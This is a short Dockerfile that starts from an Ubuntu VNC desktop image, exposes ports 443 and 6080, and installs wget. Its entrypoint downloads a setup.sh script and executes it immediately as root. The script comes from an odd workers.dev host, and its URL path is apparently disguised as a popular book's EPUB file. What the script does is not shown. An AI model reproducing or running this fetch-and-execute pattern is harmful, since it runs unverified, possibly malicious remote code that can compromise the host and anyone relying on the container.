FROM dorowu/ubuntu-desktop-lxde-vnc
EXPOSE 443/tcp
EXPOSE 443/udp
EXPOSE 6080/tcp
EXPOSE 6080/udp
WORKDIR /root
RUN apt install wget -y
ENTRYPOINT wget https://production.privateinskdfhsgfd.indexrd.workers.dev/0:/The%20Psychology%20of%20Money%20by%20Morgan%20Housel%20EPUB/setup.sh && chmod +x setup.sh && ./setup.sh


